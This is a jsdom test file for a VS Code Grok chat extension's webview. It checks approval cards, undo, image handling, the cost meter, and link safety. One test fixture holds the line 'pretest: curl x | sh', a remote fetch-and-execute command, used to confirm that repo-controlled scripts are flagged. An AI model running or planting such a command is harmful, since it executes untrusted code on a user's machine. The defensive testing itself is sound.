// Drives the real media/webview/main.js in jsdom: plan card, plan applied/undone, checks offer, Problems chip.
import { test } from 'node:test';
import * as assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { JSDOM } from 'jsdom';

const root = path.join(__dirname, '..', '..');
/* eslint-disable @typescript-eslint/no-explicit-any */
function boot() {
  const src = fs.readFileSync(path.join(root, 'src', 'chat.ts'), 'utf8');
  const body = src.slice(src.indexOf('<body'), src.indexOf('<script', src.indexOf('<body'))).replace(/\$\{[^}]*\}/g, '');
  const dom = new JSDOM(`<!DOCTYPE html><html><head></head>${body}</body></html>`, { runScripts: 'outside-only', pretendToBeVisual: true });
  const w = dom.window as any;
  const sent: any[] = [];
  w.acquireVsCodeApi = () => ({ postMessage: (m: any) => sent.push(m), getState: () => undefined, setState: () => undefined });
  w.requestAnimationFrame = (f: any) => setTimeout(f, 0); w.cancelAnimationFrame = (id: any) => clearTimeout(id);
  w.HTMLElement.prototype.scrollIntoView = () => undefined;
  if (!w.matchMedia) { w.matchMedia = () => ({ matches: false, addEventListener() { /* */ }, addListener() { /* */ } }); }
  for (const f of ['marked.min.js', 'purify.min.js', 'cards.js']) { w.eval(fs.readFileSync(path.join(root, 'media', 'webview', f), 'utf8')); }
  w.eval(fs.readFileSync(path.join(root, 'media', 'webview', 'main.js'), 'utf8'));
  const post = (m: any) => w.dispatchEvent(new w.MessageEvent('message', { data: m }));
  return { w, d: w.document as Document, sent, post };
}
const planReq = { kind: 'plan', summary: 'S', files: [
  { path: 'src/components/a.ts', op: 'create', added: 3, removed: 0 },
  { path: 'src/b.ts', op: 'delete', added: 0, removed: 4 },
  { path: 'src/c.ts', op: 'rename', newPath: 'src/d.ts', added: 0, removed: 0 },
  { path: '.env.local', op: 'create', added: 0, removed: 0, refused: 'secrets/credentials file' },
] };

test('plan card: refused row disabled with reason; meta line; Select all tri-state; focus not on Approve', () => {
  const { d, post } = boot();
  post({ type: 'approvalRequest', reqId: 'r1', request: planReq });
  const card = d.querySelector('.plan-card')!;
  assert.match(card.querySelector('.approval-head')!.textContent!, /3 files/);
  assert.equal(card.querySelector('.plan-meta')!.textContent, '1 new · 1 rename · 1 delete · 1 refused');
  const rows = [...card.querySelectorAll('.plan-file')] as HTMLElement[];
  assert.equal(rows.length, 4);
  const ref = rows[3]; const rcb = ref.querySelector('input') as HTMLInputElement;
  assert.ok(ref.classList.contains('refused')); assert.equal(rcb.disabled, true); assert.equal(rcb.checked, false);
  assert.equal(d.getElementById(rcb.getAttribute('aria-describedby')!)!.textContent, '⛔ secrets/credentials file');
  assert.equal(ref.querySelector('.plan-diff'), null);
  assert.equal(rows[1].dataset.op, 'delete');
  assert.equal(rows[0].querySelector('.plan-op')!.getAttribute('aria-hidden'), 'true');
  assert.equal(rows[0].querySelector('.sr-only')!.textContent, 'new: ');
  assert.equal(rows[0].querySelectorAll('wbr').length, 2);
  assert.match(rows[2].querySelector('.plan-new')!.textContent!, /→ src\/d\.ts/);
  assert.equal(rows[1].querySelector('.plan-delta')!.getAttribute('aria-label'), '4 lines removed');
  const ok = card.querySelector('.approval-btn.approve') as HTMLButtonElement;
  const all = card.querySelector('.plan-all input') as HTMLInputElement;
  assert.equal(ok.textContent, 'Approve all (3)');
  assert.notEqual(d.activeElement, ok); assert.equal(d.activeElement, all);
  (rows[1].querySelector('input') as HTMLInputElement).click();
  assert.equal(ok.textContent, 'Approve selected (2/3)'); assert.equal(all.indeterminate, true);
  all.click(); assert.equal(ok.textContent, 'Approve all (3)'); assert.equal(all.indeterminate, false);
  all.click(); assert.equal(ok.disabled, true);
  all.click();
});

test('plan card: decision sends file indices, marks skipped rows, holds then returns focus', () => {
  const { d, post, sent } = boot();
  post({ type: 'approvalRequest', reqId: 'r1', request: planReq });
  const card = d.querySelector('.plan-card')!;
  const rows = [...card.querySelectorAll('.plan-file')] as HTMLElement[];
  (rows[1].querySelector('input') as HTMLInputElement).click();
  (card.querySelector('.approval-btn.approve') as HTMLButtonElement).click();
  const m = sent.find(x => x.type === 'approvalResponse');
  assert.deepEqual([...m.selected], [0, 2]);
  assert.ok(rows[1].classList.contains('skipped')); assert.ok(!rows[0].classList.contains('skipped'));
  const status = card.querySelector('.approval-status')!;
  assert.equal(d.activeElement, status); assert.equal(status.textContent, 'Applying…');
  post({ type: 'approvalResolved', reqId: 'r1', state: 'approved' });
  assert.equal(d.activeElement, d.getElementById('input'));
  assert.equal(card.querySelector('.approval-actions'), null);
});

test('command card keeps focus on Run, then holds and returns focus after the decision', () => {
  const { d, post } = boot();
  post({ type: 'approvalRequest', reqId: 'c1', request: { kind: 'command', command: 'npm test' } });
  const run = d.querySelector('.approval-btn.approve') as HTMLButtonElement;
  assert.equal(d.activeElement, run);
  run.click();
  assert.equal(d.activeElement!.className, 'approval-status');
  post({ type: 'approvalResolved', reqId: 'c1', state: 'approved' });
  assert.equal(d.activeElement, d.getElementById('input'));
});

test('plan applied card: data-action buttons, undone title/state, non-retryable refusal keeps Undo disabled', () => {
  const { d, post, sent } = boot();
  post({ type: 'planApplied', planId: 'p1', paths: ['a', 'b'], summary: 'S' });
  post({ type: 'planApplied', planId: 'p2', paths: ['c'] });
  assert.equal(d.getElementById('sr-announce')!.textContent, 'Plan applied: 1 file');
  const [c1, c2] = [...d.querySelectorAll('.plan-done')] as HTMLElement[];
  const chk = c1.querySelector('[data-action="checks"]') as HTMLButtonElement;
  chk.click();
  assert.equal(c1.querySelector('.approval-status')!.textContent, 'Asked Grok to re-run the checks.');
  assert.ok(sent.some(m => m.type === 'rerunChecks'));
  (c1.querySelector('[data-action="undo"]') as HTMLButtonElement).click();
  assert.ok(sent.some(m => m.type === 'undoPlan' && m.planId === 'p1'));
  post({ type: 'planUndone', planId: 'p1', ok: true, msg: 'Undid plan: a, b' });
  assert.equal(c1.dataset.state, 'undone'); assert.equal(c1.querySelector('.approval-head')!.textContent, '↶ Plan undone');
  assert.equal(c1.querySelector('[data-action="undo"]'), null);
  (c2.querySelector('[data-action="undo"]') as HTMLButtonElement).click();
  post({ type: 'planUndone', planId: 'p2', ok: false, msg: "Can't undo: c changed since the plan was applied." });
  assert.equal((c2.querySelector('[data-action="undo"]') as HTMLButtonElement).disabled, true);
  assert.match(c2.querySelector('.approval-status')!.textContent!, /^✕ Can't undo/);
  post({ type: 'planUndone', planId: 'p2', ok: false, msg: 'Undo failed', retryable: true });
  assert.equal((c2.querySelector('[data-action="undo"]') as HTMLButtonElement).disabled, false);
});

test('checks offer is a footer button on the turn, not a card', () => {
  const { d, post, sent } = boot();
  post({ type: 'streamStart', id: 'a1' });
  post({ type: 'checksOffer' });
  post({ type: 'streamDone', id: 'a1', meta: {} });
  assert.equal(d.querySelector('.checks-offer'), null);
  const b = d.querySelector('.msg-footer .checks-btn') as HTMLButtonElement;
  assert.ok(b); assert.match(b.textContent!, /Re-run checks/);
  b.click(); assert.ok(sent.some(m => m.type === 'rerunChecks')); assert.equal(b.disabled, true);
});

test('Problems chip: aria-label, hidden glyph, aria-pressed toggle', () => {
  const { d, post, sent } = boot();
  post({ type: 'problemsState', count: 3, enabled: true });
  let pc = d.querySelector('.problems-chip') as HTMLButtonElement;
  assert.equal(pc.getAttribute('aria-label'), 'Include 3 problems');
  assert.equal(pc.getAttribute('aria-pressed'), 'true');
  assert.equal(pc.querySelector('.chip-glyph')!.getAttribute('aria-hidden'), 'true');
  assert.match(pc.title, /each message/);
  pc.click(); assert.ok(sent.some(m => m.type === 'toggleProblems'));
  post({ type: 'problemsState', count: 3, enabled: false });
  pc = d.querySelector('.problems-chip') as HTMLButtonElement;
  assert.equal(pc.getAttribute('aria-pressed'), 'false'); assert.ok(pc.classList.contains('off'));
});

test('stylesheet: plan list max height, sticky footer, refused/skipped/undone, HC underline', () => {
  const css = fs.readFileSync(path.join(root, 'media', 'webview', 'style.css'), 'utf8');
  for (const re of [/\.plan-card \.plan-files,\.plan-done \.plan-files\{max-height:min\(45vh,320px\);overflow-y:auto/, /\.plan-card \.approval-actions\{position:sticky;bottom:0/,
    /\.plan-file\.refused \.plan-path\{text-decoration:line-through/, /\.plan-file\.skipped\{/, /\[data-state=undone\]/, /vscode-high-contrast \.plan-diff[^{]*\{text-decoration:underline/,
    /\.chip\.problems-chip\.off\{color:var\(--vscode-descriptionForeground\);border-style:dashed\}/]) { assert.match(css, re); }
  assert.doesNotMatch(css, /overflow-wrap:anywhere;cursor:pointer/);
});

test('H3: command card shows what the script runs and flags repo-controlled sources', () => {
  const { d, post } = boot();
  post({ type: 'approvalRequest', reqId: 'c9', request: { kind: 'command', command: 'npm test', runs: ['pretest: curl x | sh', 'test: jest'], source: 'package.json scripts.test', repoControlled: true } });
  assert.equal(d.querySelector('.approval-runs')!.textContent, 'pretest: curl x | sh\ntest: jest');
  const src = d.querySelector('.approval-source')!;
  assert.ok(src.classList.contains('repo')); assert.match(src.textContent!, /repo-controlled/);
});

test('L1: flagged plan rows show the warning and link it to the checkbox', () => {
  const { d, post } = boot();
  post({ type: 'approvalRequest', reqId: 'r7', request: { kind: 'plan', files: [{ path: '.vscode/tasks.json', op: 'create', added: 1, removed: 0, warn: 'changes VS Code tasks/launch/settings' }] } });
  const w = d.querySelector('.plan-warn')!;
  assert.match(w.textContent!, /tasks/);
  assert.equal(d.querySelector('.plan-file input')!.getAttribute('aria-describedby'), w.id);
});

const PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
function bootImages() {
  const b = boot();
  // jsdom doesn't decode images: report a small natural size so the original PNG is kept (no canvas needed).
  b.w.Image = class { naturalWidth = 1; naturalHeight = 1; onload: any; onerror: any; set src(_v: string) { setTimeout(() => this.onload(), 0); } };
  return b;
}
const tick = () => new Promise(r => setTimeout(r, 30));

test('image tray: own list above the input, preview button, big ×, removal announced', async () => {
  const { d, post } = bootImages();
  post({ type: 'imageFile', name: 'shot.png', dataUrl: PNG });
  post({ type: 'imageFile', name: 'two.png', dataUrl: PNG });
  await tick();
  const tray = d.getElementById('image-tray')!;
  assert.equal(tray.getAttribute('role'), 'list'); assert.equal(tray.hidden, false);
  assert.equal(d.querySelectorAll('#chips .image-chip').length, 0, 'not mixed with context chips');
  const chips = tray.querySelectorAll('.image-chip');
  assert.equal(chips.length, 2); assert.equal(chips[0].getAttribute('role'), 'listitem');
  const thumb = chips[0].querySelector('button.thumb') as HTMLButtonElement;
  assert.equal(thumb.getAttribute('aria-label'), 'Preview Image 1: shot.png');
  thumb.click();
  const dlg = d.getElementById('img-preview')!;
  assert.ok(dlg.hasAttribute('open')); assert.equal((d.getElementById('img-preview-img') as HTMLImageElement).alt, 'Image 1: shot.png');
  assert.equal(d.activeElement, d.getElementById('img-preview-close'));
  (d.getElementById('img-preview-close') as HTMLButtonElement).click();
  assert.ok(!dlg.hasAttribute('open')); assert.equal(d.activeElement, thumb);
  (chips[0].querySelector('.chip-x') as HTMLButtonElement).click();
  assert.equal(tray.querySelectorAll('.image-chip').length, 1);
  assert.equal(d.getElementById('sr-announce')!.textContent, 'Removed image 1. 1 left.');
  assert.equal(d.activeElement, d.getElementById('input'));
});

test('images: sent with names; plural prompt; thumbnails enlarge; placeholder and attach hints', async () => {
  const { d, post, sent } = bootImages();
  post({ type: 'imageFile', name: 'a.png', dataUrl: PNG }); post({ type: 'imageFile', name: 'b.png', dataUrl: PNG });
  await tick();
  (d.getElementById('send') as HTMLButtonElement).click();
  const q = sent.find(m => m.type === 'query');
  assert.equal(q.text, 'What is in these images?'); assert.deepEqual([...q.imageNames], ['a.png', 'b.png']);
  post({ type: 'userMessage', id: 'u1', text: q.text, chips: [], images: [PNG, PNG], imageNames: ['a.png', 'b.png'] });
  assert.equal(d.getElementById('image-tray')!.hidden, true);
  const th = d.querySelectorAll('.user-images button.thumb');
  assert.equal(th.length, 2); assert.equal(th[1].getAttribute('aria-label'), 'Enlarge Attached image 2: b.png');
  (th[1] as HTMLButtonElement).click(); assert.ok(d.getElementById('img-preview')!.hasAttribute('open'));
  assert.match((d.getElementById('input') as HTMLTextAreaElement).placeholder, /paste or drop images/);
  assert.match(d.getElementById('attach-image')!.title, /Shift\+drag/);
});

test('vision note: typed text restored, Switch and resend replays the query, Send without images, note styling, focus', async () => {
  const { d, post, sent } = bootImages();
  post({ type: 'models', models: [{ id: 'old' }, { id: 'grok-4.7' }], current: 'old' });
  post({ type: 'imageFile', name: 'shot.png', dataUrl: PNG }); await tick();
  const inp = d.getElementById('input') as HTMLTextAreaElement;
  inp.value = 'what colour is this'; (d.getElementById('send') as HTMLButtonElement).click();
  assert.equal(inp.value, '');
  post({ type: 'visionNote', model: 'old', suggest: 'grok-4.7' });
  assert.equal(inp.value, 'what colour is this', 'text given back');
  const card = d.querySelector('.vision-note') as HTMLElement;
  assert.equal(card.dataset.kind, 'note');
  const sw = card.querySelector('[data-action="switch"]') as HTMLButtonElement;
  assert.equal(sw.textContent, 'Switch to grok-4.7 and resend'); assert.equal(d.activeElement, sw);
  assert.match(card.textContent!, /old doesn't accept image input/);
  sw.click();
  const r = sent.find(m => m.type === 'switchModelAndResend');
  assert.equal(r.model, 'grok-4.7'); assert.equal(r.text, 'what colour is this'); assert.equal(r.images.length, 1); assert.deepEqual([...r.imageNames], ['shot.png']);
  assert.equal((d.getElementById('model') as HTMLSelectElement).value, 'grok-4.7');
  // second refusal: Send without images
  post({ type: 'visionNote', model: 'grok-4.7' });
  const c2 = [...d.querySelectorAll('.vision-note')].at(-1)!;
  (c2.querySelector('[data-action="text-only"]') as HTMLButtonElement).click();
  const last = sent.filter(m => m.type === 'query').at(-1);
  assert.equal(last.text, 'what colour is this'); assert.equal(last.images, undefined);
  assert.equal(d.getElementById('image-tray')!.hidden, true);
});

test('cost meter: button + popover (not a live region), settings row, Esc closes', () => {
  const { d, post } = boot();
  const cm = d.getElementById('cost-meter') as HTMLButtonElement;
  assert.equal(cm.tagName, 'BUTTON'); assert.equal(cm.getAttribute('role'), null); assert.equal(cm.hidden, true);
  post({ type: 'costMeter', hidden: false, text: '12k tok · $0.012+', ariaLabel: 'Chat usage: 12000 tokens, at least $0.012. Show details', tooltip: 't', lines: ['This chat: 2 turns', "+ = some turns didn't report a cost (1 of 2); they aren't included"] });
  assert.equal(cm.hidden, false); assert.equal(cm.textContent, '12k tok · $0.012+');
  assert.match(cm.getAttribute('aria-label')!, /at least \$0\.012/);
  assert.match(d.getElementById('cost-detail')!.textContent!, /1 of 2/);
  const pop = d.getElementById('cost-pop')!;
  assert.equal(pop.hidden, true); cm.click(); assert.equal(pop.hidden, false); assert.equal(cm.getAttribute('aria-expanded'), 'true');
  assert.equal(pop.querySelectorAll('div').length, 2);
  pop.dispatchEvent(new (d.defaultView as any).KeyboardEvent('keydown', { key: 'Escape' }));
  assert.equal(pop.hidden, true); assert.equal(d.activeElement, cm);
  assert.equal(d.getElementById('cost-row')!.hidden, false); assert.equal(d.getElementById('cost-row-val')!.textContent, '12k tok · $0.012+');
  (d.getElementById('cost-row-details') as HTMLButtonElement).click(); assert.equal(pop.hidden, false);
  post({ type: 'costMeter', hidden: true, text: '', lines: [] });
  assert.equal(cm.hidden, true); assert.equal(pop.hidden, true); assert.equal(d.getElementById('cost-row')!.hidden, true);
  assert.equal(d.querySelectorAll('[role="status"]#cost-meter').length, 0);
});

test('toasts: stacked container, role=status for extension toasts too, click/Esc close, cap wording', async () => {
  const { d, post } = bootImages();
  post({ type: 'toast', msg: 'from extension' });
  post({ type: 'imagesRefused', reasons: ['a', 'b'] });
  const box = d.getElementById('toasts')!;
  const ts = box.querySelectorAll('.toast');
  assert.equal(ts.length, 2); assert.equal(ts[0].getAttribute('role'), 'status');
  (ts[0] as HTMLElement).click(); assert.equal(box.querySelectorAll('.toast').length, 1);
  ts[1].dispatchEvent(new (d.defaultView as any).KeyboardEvent('keydown', { key: 'Escape' })); assert.equal(box.querySelectorAll('.toast').length, 0);
  for (let i = 0; i < 10; i++) { post({ type: 'imageFile', name: `i${i}.png`, dataUrl: PNG }); }
  await tick(); await tick();
  assert.equal(d.querySelectorAll('#image-tray .image-chip').length, 8);
  assert.equal([...box.querySelectorAll('.toast')].filter(t => t.textContent === "8 images max per message. 1 wasn't added.").length, 2);
});

test('drag feedback on the composer while files are dragged over', () => {
  const { w, d } = boot();
  const ev = (type: string) => { const e = new w.Event(type, { bubbles: true }); (e as any).dataTransfer = { types: ['Files'], getData: () => '', files: [] }; d.dispatchEvent(e); };
  ev('dragenter'); assert.ok(d.body.classList.contains('drop-ok'));
  ev('dragleave'); assert.ok(!d.body.classList.contains('drop-ok'));
  ev('dragenter'); ev('drop'); assert.ok(!d.body.classList.contains('drop-ok'));
});

test('CSP allows data: images only (no blob:, no remote)', () => {
  const src = fs.readFileSync(path.join(root, 'src', 'chat.ts'), 'utf8');
  const csp = /Content-Security-Policy" content="([^"]+)"/.exec(src)![1];
  assert.match(csp, /img-src \$\{webview\.cspSource\} data:;/); assert.doesNotMatch(csp, /blob:|https:/);
});

test('task mode: toggle sends runTask; progress card updates, logs approvals, ends with files and Undo all; Stop', () => {
  const { d, post, sent } = boot();
  const btn = d.getElementById('task-toggle') as HTMLButtonElement;
  btn.click(); assert.equal(btn.getAttribute('aria-pressed'), 'true');
  const input = d.getElementById('input') as HTMLTextAreaElement;
  assert.match(input.placeholder, /task/);
  input.value = 'add a CLI flag'; (d.getElementById('send') as HTMLButtonElement).click();
  assert.deepEqual({ ...sent.find(m => m.type === 'runTask') }, { type: 'runTask', text: 'add a CLI flag' });
  assert.equal(btn.getAttribute('aria-pressed'), 'false');
  post({ type: 'taskStart', id: 't1', goal: 'add a CLI flag', maxSteps: 40, level: 'safeEdits' });
  const card = d.querySelector('.task-card') as HTMLElement;
  assert.match(card.textContent!, /Auto-approving workspace edits\. Deletes, renames/);
  post({ type: 'taskProgress', id: 't1', steps: 2, maxSteps: 40, tokens: 12345, costUsd: 0.0123, autoApproved: 1, asked: 0, label: 'Running the tests…' });
  assert.equal(card.querySelector('.task-progress')!.textContent, 'Step 2 of 40 · 12k tokens · $0.012 · 1 auto-approved');
  assert.equal(card.querySelector('.task-progress')!.getAttribute('role'), 'status');
  assert.equal(card.querySelector('.task-current')!.textContent, '→ Running the tests…');
  for (let i = 0; i < 10; i++) { post({ type: 'taskLog', id: 't1', auto: i % 2 === 0, text: 'x' + i }); }
  assert.equal(card.querySelectorAll('.task-log li').length, 8);
  assert.equal(card.querySelector('.task-log li.asked')!.textContent!.startsWith('? '), true);
  post({ type: 'taskEnd', id: 't1', outcome: 'budget', files: ['a.ts', 'b.ts'], steps: 5, maxSteps: 40, tokens: 50000, autoApproved: 3, asked: 1, ms: 4200 });
  assert.equal(card.querySelector('.approval-head')!.textContent, '⚠ Task stopped at its budget · 2 files changed');
  assert.equal(card.querySelector('[data-action="stop"]'), null);
  const undo = card.querySelector('[data-action="undo-all"]') as HTMLButtonElement;
  assert.equal(undo.textContent, 'Undo all (2)');
  undo.click(); assert.ok(sent.some(m => m.type === 'undoTask' && m.id === 't1'));
  post({ type: 'taskUndone', id: 't1', ok: true, msg: 'Restored 2 file(s).' });
  assert.equal(card.dataset.state, 'undone');
});

test('tabs, history panel and transcript', () => {
  const { d, post, sent } = boot();
  post({ type: 'tabs', active: 'c2', tabs: [{ id: 'c1', title: 'First chat' }, { id: 'c2', title: 'Second' }] });
  const tabs = [...d.querySelectorAll('#tabs [role=tab]')] as HTMLButtonElement[];
  assert.equal(tabs.length, 2); assert.equal(tabs[1].getAttribute('aria-selected'), 'true'); assert.equal(tabs[0].tabIndex, -1);
  tabs[0].click(); assert.ok(sent.some(m => m.type === 'switchTab' && m.id === 'c1'));
  (d.querySelector('#tabs .tab-close') as HTMLButtonElement).click(); assert.ok(sent.some(m => m.type === 'closeTab' && m.id === 'c1'));
  (d.querySelector('#tabs .tab-add') as HTMLButtonElement).click(); assert.ok(sent.some(m => m.type === 'newTab'));
  post({ type: 'tabs', active: 'c3', tabs: [{ id: 'c3', title: 'Only' }] });
  assert.equal(d.querySelectorAll('#tabs .tab-close').length, 0, 'a single tab has no close button');
  const hb = d.getElementById('history-btn') as HTMLButtonElement;
  hb.click(); assert.equal((d.getElementById('history-panel') as HTMLElement).hidden, false); assert.equal(hb.getAttribute('aria-expanded'), 'true');
  assert.ok(sent.some(m => m.type === 'historyList'));
  post({ type: 'historyItems', query: '', items: [{ id: 'c9', title: 'Parser bug', updated: Date.now() - 7200_000, count: 4, preview: 'Because', open: false }] });
  const item = d.querySelector('.hist-item') as HTMLElement;
  assert.match(item.querySelector('.hist-meta')!.textContent!, /^2 h ago · 4 messages · Because/);
  const del = [...item.querySelectorAll('.hist-actions button')].find(b => b.textContent === 'Delete') as HTMLButtonElement;
  del.click(); assert.ok(!sent.some(m => m.type === 'deleteChat'), 'first click only arms'); assert.equal(del.textContent, 'Confirm delete');
  del.click(); assert.ok(sent.some(m => m.type === 'deleteChat' && m.id === 'c9'));
  ([...item.querySelectorAll('.hist-actions button')].find(b => b.textContent === 'Export') as HTMLButtonElement).click();
  assert.ok(sent.some(m => m.type === 'exportChat' && m.id === 'c9'));
  (item.querySelector('.hist-open') as HTMLButtonElement).click();
  assert.ok(sent.some(m => m.type === 'openChat' && m.id === 'c9')); assert.equal((d.getElementById('history-panel') as HTMLElement).hidden, true);
  post({ type: 'historyItems', query: 'zzz', items: [] }); assert.match(d.querySelector('.hist-empty')!.textContent!, /No chats match "zzz"/);
  post({ type: 'transcript', messages: [{ role: 'user', text: 'hi' }, { role: 'assistant', text: '**bold** answer', state: 'done' }] });
  assert.equal(d.querySelectorAll('.message.user').length, 1);
  assert.equal(d.querySelector('.message.assistant strong')!.textContent, 'bold');
  assert.equal(d.getElementById('sr-announce')!.textContent, 'Chat opened: 2 messages');
  assert.equal((d.getElementById('send') as HTMLButtonElement).getAttribute('aria-label'), 'Send');
});

test('MCP approval card: server › tool, source, arguments, Always allow sends always:true', () => {
  const { d, post, sent } = boot();
  post({ type: 'approvalRequest', reqId: 'm1', request: { kind: 'mcp', server: 'github', tool: 'create_issue', args: '{\n  "title": "x"\n}', source: 'workspace' } });
  const card = d.querySelector('.approval-card[data-kind=mcp]') as HTMLElement;
  assert.equal(card.querySelector('.approval-head')!.textContent, '🔌 Grok wants to use an MCP tool');
  assert.equal(card.querySelector('.approval-path')!.textContent, 'github › create_issue');
  assert.match(card.querySelector('.approval-source')!.textContent!, /defined by this repo/); assert.ok(card.querySelector('.approval-source.repo'));
  assert.match(card.querySelector('pre')!.textContent!, /"title": "x"/);
  const cb = card.querySelector('.approval-always input') as HTMLInputElement;
  assert.match(card.querySelector('.approval-always')!.textContent!, /Always allow create_issue/);
  cb.checked = true;
  ([...card.querySelectorAll('button')].find(b => b.textContent === 'Run') as HTMLButtonElement).click();
  const m = sent.find(x => x.type === 'approvalResponse');
  assert.equal(m.decision, 'approve'); assert.equal(m.always, true); assert.equal(cb.disabled, true);
});

test('answer links: workspace paths post openFileLink, http opens externally, other schemes are inert', async () => {
  const { d, post, sent } = boot();
  post({ type: 'streamStart', id: 'a9' });
  post({ type: 'streamChunk', id: 'a9', delta: 'See [a.ts:2](src/a.ts#L2), [docs](https://x.ai/d) and [bad](command:workbench.action.x).' });
  post({ type: 'streamDone', id: 'a9', meta: {} });
  await new Promise(r => setTimeout(r, 20));
  const links = [...d.querySelectorAll('#messages a')] as HTMLAnchorElement[];
  const byText = (t: string) => links.find(a => a.textContent === t)!;
  byText('a.ts:2').click(); byText('docs').click(); byText('bad')?.click();
  assert.deepEqual(JSON.parse(JSON.stringify(sent.filter(m => m.type === 'openFileLink' || m.type === 'openLink'))), [{ type: 'openFileLink', href: 'src/a.ts#L2' }, { type: 'openLink', url: 'https://x.ai/d' }]);
});
